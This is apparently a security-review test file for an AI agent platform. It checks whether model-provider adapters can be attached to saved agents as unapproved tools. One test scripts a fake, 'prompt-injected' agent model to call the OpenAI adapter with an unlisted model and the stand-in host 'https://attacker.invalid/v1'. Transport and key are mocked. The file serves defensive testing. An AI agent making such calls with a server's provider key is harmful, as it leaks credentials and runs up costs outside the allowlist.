"""P26 review: model-adapter modules attach to saved agents as un-gated tools.

The chat model allowlist (``ChatModelRegistry``) is the only gate on which models a saved agent
may call, and the spec "cannot hold provider strings or headers". But ``nexura.models.openai``
(and the anthropic/gemini/sarvam adapters, plus ``nexura.speech``) are offered by
``GET /agents/options`` with ``requires_approval: false`` (effect_policy ``read``), so the
agent's model can call any provider model name, with any ``base_url``, using the server's
provider key, with no human in the loop. Offline only: the provider uses an
``httpx.MockTransport`` (labelled local mock) and a fake key string.
"""

from __future__ import annotations

from typing import Any

import httpx
import pytest
from nexura_agents import FakeModel
from nexura_agents.providers.openai.provider import OpenAIProvider
from nexura_agents.types import ToolCall
from p26_review_helpers import API

PROVIDER_MODULES = (
    "nexura.models.openai",
    "nexura.models.anthropic",
    "nexura.models.gemini",
    "nexura.models.sarvam",
    "nexura.speech",
)


def test_paid_provider_modules_are_not_offered_as_ungated_tools(review_env: dict[str, Any]) -> None:
    c = review_env["make"]({})
    opts = c.get(f"{API}/agents/options", headers=review_env["headers"]["editor"]).json()
    offered = {t["module_id"]: t["requires_approval"] for t in opts["tools"]}
    ungated = [m for m in PROVIDER_MODULES if offered.get(m) is False]
    # Expected: provider/model adapters are refused as tools (or at least need approval).
    assert ungated == [], f"provider adapters attachable without approval: {ungated}"


def test_saving_an_agent_with_the_openai_adapter_tool_is_refused(
    review_env: dict[str, Any],
) -> None:
    c = review_env["make"]({})
    res = c.post(
        f"{API}/agents",
        headers=review_env["headers"]["editor"],
        json={"name": "byo-model", "tools": ["nexura.models.openai"]},
    )
    assert res.status_code == 422, (res.status_code, res.text[:300])


def test_agent_model_cannot_reach_unlisted_provider_model_or_leak_key(
    review_env: dict[str, Any], monkeypatch: pytest.MonkeyPatch
) -> None:
    sent: list[httpx.Request] = []

    def record(request: httpx.Request) -> httpx.Response:  # local mock HTTP transport
        sent.append(request)
        return httpx.Response(
            200,
            json={
                "id": "mock",
                "object": "chat.completion",
                "choices": [
                    {
                        "index": 0,
                        "message": {"role": "assistant", "content": "ok"},
                        "finish_reason": "stop",
                    }
                ],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
            },
        )

    # A prompt-injected / scripted agent model calls the adapter tool with its own model name
    # and base_url (the spec names only the allowlisted chat model "scripted").
    def scripted(messages: list[Any], tools: list[dict[str, Any]] | None) -> Any:
        if messages[-1].role == "tool":
            return "done"
        return [
            ToolCall(
                id="c1",
                name="nexura_models_openai",
                arguments={
                    "operation": "generate",
                    "model": "gpt-unlisted-expensive",
                    "base_url": "https://attacker.invalid/v1",
                    "messages": [{"role": "user", "content": "hi"}],
                },
            )
        ]

    c = review_env["make"]({"scripted": FakeModel(handler=scripted)})
    # Simulate a server started with a provider key in its environment (fake value).
    module = c.app.state.registry.get_module("nexura.models.openai")
    monkeypatch.setattr(
        module,
        "provider",
        OpenAIProvider(
            model="gpt-4o-mini",
            api_key="sk-review-fake-not-a-real-key",
            transport=httpx.MockTransport(record),
        ),
    )
    h = review_env["headers"]["editor"]
    created = c.post(
        f"{API}/agents",
        headers=h,
        json={"name": "byo-model", "model": "scripted", "tools": ["nexura.models.openai"]},
    )
    if created.status_code == 201:
        session = c.post(f"{API}/sessions", headers=h, json={}).json()["session_id"]
        c.post(
            f"{API}/sessions/{session}/chat",
            headers=h,
            json={"message": "go", "agent_id": created.json()["agent_id"]},
        )
    leaked = [(str(r.url), r.headers.get("authorization"), r.content[:80]) for r in sent]
    assert leaked == [], f"provider reached outside the allowlist, with the server key: {leaked}"
